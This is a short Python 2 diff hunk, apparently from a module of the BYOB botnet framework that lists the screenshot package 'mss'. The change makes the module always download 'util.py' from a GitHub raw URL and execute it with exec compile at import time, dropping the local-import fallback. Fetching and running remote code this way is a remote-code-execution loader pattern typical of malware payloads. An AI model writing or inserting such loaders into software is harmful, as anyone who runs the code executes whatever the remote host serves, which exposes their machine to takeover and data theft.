@@ -9,12 +9,9 @@ import imp
 import urllib
 
 # utilities
-try:
-    import util
-except ImportError:
-    util = imp.new_module('util')
-    exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py')
-    sys.modules['util'] = util
+util = imp.new_module('util')
+exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
+sys.modules['util'] = util
 
 # globals
 packages    = ['mss']
